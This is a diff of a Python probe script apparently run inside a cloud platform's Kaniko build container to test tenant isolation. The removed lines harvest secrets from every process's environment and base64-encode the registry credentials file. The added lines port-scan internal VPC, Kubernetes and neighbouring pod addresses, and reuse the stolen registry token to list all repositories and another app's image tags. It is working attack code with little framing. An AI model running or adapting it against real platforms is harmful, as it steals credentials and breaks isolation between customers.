@@ -1,201 +1,257 @@
-import json, os, socket, subprocess, struct, time, glob
+import json, os, socket, subprocess, time, struct
 
 r = {}
 
-# 1. Check our own build args / env - do we see the SECRET?
-r['env'] = dict(os.environ)
+# 1. VPC network access (DOKS worker IPs from our clusters)
+vpc_targets = {
+    # DOKS Cluster A workers (nyc1 VPC)
+    '10.116.0.2:443': 'doks-worker-a1',
+    '10.116.0.3:443': 'doks-worker-a2',
+    '10.116.0.2:10250': 'kubelet-a1',
+    # DOKS Cluster B workers (nyc2 VPC)
+    '10.116.0.4:443': 'doks-worker-b',
+    # Common VPC services
+    '10.116.0.1:443': 'vpc-gateway',
+    '10.116.0.1:80': 'vpc-gateway-80',
+    # Managed DB default ports
+    '10.116.0.2:25060': 'managed-db-pg',
+    '10.116.0.2:25061': 'managed-db-mysql',
+    '10.116.0.2:6379': 'managed-redis',
+    # CGNAT (DOKS control plane bridge)
+    '100.65.67.229:443': 'cp-bridge-a',
+    '100.65.74.2:443': 'cp-bridge-b',
+    # Anchor IP (OTEL)
+    '10.10.0.5:4318': 'otel-anchor',
+}
 
-# 2. Read ALL process cmdlines - look for --build-arg with secrets from other builds
-procs = {}
-try:
-    for pid_dir in sorted(glob.glob('/proc/[0-9]*'), key=lambda x: int(x.split('/')[-1])):
-        pid = pid_dir.split('/')[-1]
-        try:
-            cmdline = open(f'/proc/{pid}/cmdline').read().replace('\x00', ' ').strip()
-            procs[pid] = {'cmdline': cmdline[:500]}
-        except:
-            pass
-        try:
-            environ = open(f'/proc/{pid}/environ').read().replace('\x00', '\n').strip()
-            procs[pid]['environ'] = environ[:2000]
-        except Exception as e:
-            procs[pid]['environ_err'] = str(e)[:100]
-        try:
-            procs[pid]['comm'] = open(f'/proc/{pid}/comm').read().strip()
-        except:
-            pass
-        try:
-            procs[pid]['status'] = open(f'/proc/{pid}/status').read()[:500]
-        except:
-            pass
-except:
-    pass
-r['processes'] = procs
-
-# 3. Check if we can see other build pods' processes via /proc
-r['pid_max'] = 0
-try:
-    pids = [int(p) for p in os.listdir('/proc') if p.isdigit()]
-    r['pid_count'] = len(pids)
-    r['pid_max'] = max(pids) if pids else 0
-    r['pid_list'] = sorted(pids)
-except:
-    pass
-
-# 4. Check shared filesystems that might have other builds' data
-shared_fs = {}
-# Check if /kaniko is shared
-try:
-    shared_fs['kaniko_contents'] = []
-    for root, dirs, files in os.walk('/kaniko'):
-        for f in files:
-            fp = os.path.join(root, f)
-            try:
-                st = os.stat(fp)
-                shared_fs['kaniko_contents'].append(f'{fp} size={st.st_size} mode={oct(st.st_mode)}')
-            except:
-                pass
-except:
-    pass
-
-# Check /tmp for shared data
-try:
-    shared_fs['tmp'] = os.listdir('/tmp')
-except:
-    pass
-
-# Check /.app_platform/.tmp
-try:
-    shared_fs['app_tmp'] = os.listdir('/.app_platform/.tmp')
-    for item in os.listdir('/.app_platform/.tmp'):
-        fp = os.path.join('/.app_platform/.tmp', item)
-        if os.path.isdir(fp):
-            shared_fs[f'app_tmp_{item}'] = os.listdir(fp)
+r['vpc'] = {}
+for target, label in vpc_targets.items():
+    host, port = target.rsplit(':', 1)
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(3)
+        ret = s.connect_ex((host, int(port)))
+        if ret == 0:
+            r['vpc'][target] = f'CONNECTED ({label})'
         else:
+            r['vpc'][target] = f'errno={ret}'
+        s.close()
+    except Exception as e:
+        r['vpc'][target] = str(e)[:60]
+
+# 2. Docker Hub mirror
+mirror_targets = {
+    'docker-cache.docker-cache.svc.cluster.local:5000': 'docker-mirror',
+    'docker-cache.docker-cache.svc.cluster.local:443': 'docker-mirror-tls',
+}
+r['mirror'] = {}
+for target, label in mirror_targets.items():
+    host, port = target.rsplit(':', 1)
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(3)
+        ret = s.connect_ex((host, int(port)))
+        if ret == 0:
+            r['mirror'][target] = 'CONNECTED'
+            s.close()
+            # Try HTTP catalog request
+            import urllib.request
             try:
-                shared_fs[f'app_tmp_{item}'] = open(fp).read()[:200]
-            except:
-                pass
-except:
-    pass
-
-# Check build workspace
-try:
-    shared_fs['workspace'] = os.listdir('/.app_platform_workspace')
-except:
-    pass
-
-r['shared_fs'] = shared_fs
-
-# 5. Check the Kaniko executor cmdline specifically for --build-arg
-try:
-    for pid_dir in glob.glob('/proc/[0-9]*'):
-        pid = pid_dir.split('/')[-1]
-        try:
-            cmdline = open(f'/proc/{pid}/cmdline').read()
-            if 'executor' in cmdline or 'kaniko' in cmdline:
-                # This is the Kaniko process - dump its full cmdline
-                r['kaniko_cmdline'] = cmdline.replace('\x00', ' ')[:2000]
-                # Also try to read its environ
-                try:
-                    r['kaniko_environ'] = open(f'/proc/{pid}/environ').read().replace('\x00', '\n')[:3000]
-                except Exception as e:
-                    r['kaniko_environ_err'] = str(e)[:100]
-        except:
-            pass
-except:
-    pass
-
-# 6. Check the build.sh process for secrets in its environment
-try:
-    for pid_dir in glob.glob('/proc/[0-9]*'):
-        pid = pid_dir.split('/')[-1]
-        try:
-            cmdline = open(f'/proc/{pid}/cmdline').read()
-            if 'build.sh' in cmdline and pid != str(os.getpid()):
-                r['buildsh_environ'] = open(f'/proc/{pid}/environ').read().replace('\x00', '\n')[:5000]
-                break
-        except:
-            pass
-except:
-    pass
-
-# 7. Check if the DOCR config has been updated with our secret
-try:
-    cfg = open('/kaniko/.docker/config.json').read()
-    import base64
-    r['docker_config_b64'] = base64.b64encode(cfg.encode()).decode()
-except Exception as e:
-    r['docker_config'] = str(e)[:100]
-
-# 8. Check build metadata for cross-build info
-try:
-    meta_dir = '/.app_platform/.build_metadata'
-    for root, dirs, files in os.walk(meta_dir):
-        for f in files:
-            fp = os.path.join(root, f)
-            try:
-                r[f'meta_{fp}'] = open(fp).read()[:300]
-            except:
-                pass
-except:
-    pass
-
-# 9. Try to find other pods on the network (same build node)
-# Check ARP table for neighbors
-try:
-    r['arp'] = open('/proc/net/arp').read()[:500]
-except:
-    pass
-
-# 10. Check /sys/fs/cgroup for evidence of other containers on same host
-try:
-    # In cgroup v1, kubepods dir might show other containers
-    cgroup_base = '/sys/fs/cgroup/cpu/kubepods'
-    if os.path.exists(cgroup_base):
-        r['cgroup_pods'] = []
-        for item in os.listdir(os.path.join(cgroup_base, 'burstable')):
-            if item.startswith('pod'):
-                r['cgroup_pods'].append(item)
-                # Try to list containers in each pod
-                pod_dir = os.path.join(cgroup_base, 'burstable', item)
-                try:
-                    containers = [c for c in os.listdir(pod_dir) if len(c) > 20]
-                    r[f'cgroup_{item}_containers'] = containers
-                except:
-                    pass
-except Exception as e:
-    r['cgroup_err'] = str(e)[:200]
-
-# 11. Try /sys/fs/cgroup without cpu subdir
-try:
-    for cg_type in ['cpu', 'memory', 'blkio', 'pids']:
-        base = f'/sys/fs/cgroup/{cg_type}/kubepods'
-        if os.path.exists(base):
-            r[f'cgroup_{cg_type}_exists'] = True
-            try:
-                burstable = os.path.join(base, 'burstable')
-                if os.path.exists(burstable):
-                    pods = os.listdir(burstable)
-                    r[f'cgroup_{cg_type}_pods'] = pods[:20]
+                resp = urllib.request.urlopen(f'http://{host}:{port}/v2/_catalog', timeout=3)
+                r['mirror'][f'{target}_catalog'] = resp.read().decode()[:2000]
             except Exception as e:
-                r[f'cgroup_{cg_type}_err'] = str(e)[:100]
+                r['mirror'][f'{target}_catalog'] = str(e)[:200]
+        else:
+            r['mirror'][target] = f'errno={ret}'
+            s.close()
+    except Exception as e:
+        r['mirror'][target] = str(e)[:60]
+
+# 3. K8s API access
+k8s_targets = {
+    '10.245.0.1:443': 'k8s-api',
+    '10.245.0.1:8443': 'k8s-api-8443',
+    '10.245.0.10:53': 'kube-dns',
+    '10.245.0.10:9153': 'kube-dns-metrics',
+}
+r['k8s'] = {}
+for target, label in k8s_targets.items():
+    host, port = target.rsplit(':', 1)
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(3)
+        ret = s.connect_ex((host, int(port)))
+        r['k8s'][target] = f'CONNECTED' if ret == 0 else f'errno={ret}'
+        s.close()
+    except Exception as e:
+        r['k8s'][target] = str(e)[:60]
+
+# Try HTTP to K8s API
+try:
+    import urllib.request, ssl
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    resp = urllib.request.urlopen('https://10.245.0.1:443/version', timeout=5, context=ctx)
+    r['k8s_version'] = resp.read().decode()[:500]
+except Exception as e:
+    r['k8s_version'] = str(e)[:200]
+
+# 4. Internet egress test
+r['egress'] = {}
+for target in ['8.8.8.8:53', '8.8.8.8:443', '1.1.1.1:80']:
+    host, port = target.rsplit(':', 1)
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(3)
+        ret = s.connect_ex((host, int(port)))
+        r['egress'][target] = 'CONNECTED' if ret == 0 else f'errno={ret}'
+        s.close()
+    except Exception as e:
+        r['egress'][target] = str(e)[:60]
+
+# 5. DOCR direct access - try to list/pull other repos
+r['docr'] = {}
+try:
+    import urllib.request, ssl
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+
+    # Read own docker config for token
+    token = None
+    for cfg_path in ['/kaniko/.docker/config.json', '/run/docker_config/config.json', '/home/cnb/.docker/config.json']:
+        try:
+            import json as j
+            cfg = j.loads(open(cfg_path).read())
+            for reg, auth in cfg.get('auths', {}).items():
+                if 'docr' in reg:
+                    token = auth.get('registrytoken', auth.get('auth', ''))
+                    r['docr']['config_path'] = cfg_path
+                    r['docr']['registry'] = reg
+                    break
+        except:
+            pass
+
+    if token:
+        # Try catalog (list all repos)
+        req = urllib.request.Request(f'https://apps-nyc.docr.space/v2/_catalog',
+            headers={'Authorization': f'Bearer {token}'})
+        try:
+            resp = urllib.request.urlopen(req, timeout=5, context=ctx)
+            r['docr']['catalog'] = resp.read().decode()[:2000]
+        except Exception as e:
+            r['docr']['catalog'] = str(e)[:200]
+
+        # Try listing tags for a different app's repo (IDOR test)
+        req2 = urllib.request.Request(f'https://apps-nyc.docr.space/v2/apps-nyc3-00000000-0000-0000-0000-000000000000/web/tags/list',
+            headers={'Authorization': f'Bearer {token}'})
+        try:
+            resp2 = urllib.request.urlopen(req2, timeout=5, context=ctx)
+            r['docr']['idor_test'] = resp2.read().decode()[:500]
+        except Exception as e:
+            r['docr']['idor_test'] = str(e)[:200]
+    else:
+        r['docr']['token'] = 'not_found'
+except Exception as e:
+    r['docr']['err'] = str(e)[:200]
+
+# 6. K8s service CIDR scan (quick scan of common services)
+r['svc_scan'] = {}
+for ip_suffix in [1, 2, 3, 10, 11, 50, 100, 200]:
+    target = f'10.245.0.{ip_suffix}'
+    for port in [443, 80, 8080]:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(2)
+            ret = s.connect_ex((target, port))
+            if ret == 0:
+                r['svc_scan'][f'{target}:{port}'] = 'CONNECTED'
+            s.close()
+        except:
+            pass
+
+# 7. DNS service discovery
+r['dns_disc'] = {}
+dns_queries = [
+    'docker-cache.docker-cache.svc.cluster.local',
+    'kubernetes.default.svc.cluster.local',
+    'kube-dns.kube-system.svc.cluster.local',
+    'apps-nyc.docr.space',
+    '*.build-*.svc.cluster.local',
+]
+for name in dns_queries:
+    try:
+        result = socket.getaddrinfo(name, None)
+        r['dns_disc'][name] = result[0][4][0]
+    except Exception as e:
+        r['dns_disc'][name] = str(e)[:60]
+
+# 8. Subnet scan around our pod IP
+r['neighbors'] = {}
+try:
+    my_ip = socket.gethostbyname(socket.gethostname())
+    r['my_ip'] = my_ip
+    # Scan /24 around our IP
+    prefix = '.'.join(my_ip.split('.')[:3])
+    for i in range(1, 20):  # Just first 20
+        target = f'{prefix}.{i}'
+        if target == my_ip:
+            continue
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(1)
+            ret = s.connect_ex((target, 8080))
+            if ret == 0:
+                r['neighbors'][target] = 'port_8080_open'
+            s.close()
+        except:
+            pass
+except Exception as e:
+    r['neighbors_err'] = str(e)[:100]
+
+# 9. DOKS public CP access (internet path)
+r['doks_cp'] = {}
+for target in ['24.199.65.106:443', '24.199.65.106:8999', '45.55.116.41:443']:
+    host, port = target.rsplit(':', 1)
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(3)
+        ret = s.connect_ex((host, int(port)))
+        r['doks_cp'][target] = 'CONNECTED' if ret == 0 else f'errno={ret}'
+        s.close()
+    except Exception as e:
+        r['doks_cp'][target] = str(e)[:60]
+
+# 10. /proc/net/tcp - check all established connections
+r['connections'] = {}
+try:
+    tcp = open('/proc/net/tcp').read()
+    tcp6 = open('/proc/net/tcp6').read()
+    r['connections']['tcp'] = tcp[:1000]
+    r['connections']['tcp6'] = tcp6[:1000]
 except:
     pass
 
-# 12. Check for cross-namespace DNS
-dns_tests = {}
+# 11. Route table
 try:
-    # Try to find other build namespaces
-    import socket as s
-    for ns in ['build-', 'app-', 'default', 'kube-system']:
-        try:
-            result = s.getaddrinfo(f'kubernetes.{ns}.svc.cluster.local', None)
-            dns_tests[f'k8s_{ns}'] = str(result[0][4][0])
-        except Exception as e:
-            dns_tests[f'k8s_{ns}'] = str(e)[:60]
+    r['routes'] = open('/proc/net/route').read()[:500]
 except:
     pass
-r['dns'] = dns_tests
+
+# 12. Netstat-style: what ports are we listening on
+try:
+    lines = open('/proc/net/tcp').readlines()[1:]
+    listening = []
+    for line in lines:
+        parts = line.split()
+        if len(parts) > 3 and parts[3] == '0A':  # LISTEN state
+            local = parts[1]
+            ip_hex, port_hex = local.split(':')
+            port = int(port_hex, 16)
+            listening.append(port)
+    r['listening_ports'] = listening
+except:
+    pass
 
 print(json.dumps(r, indent=2, default=str))
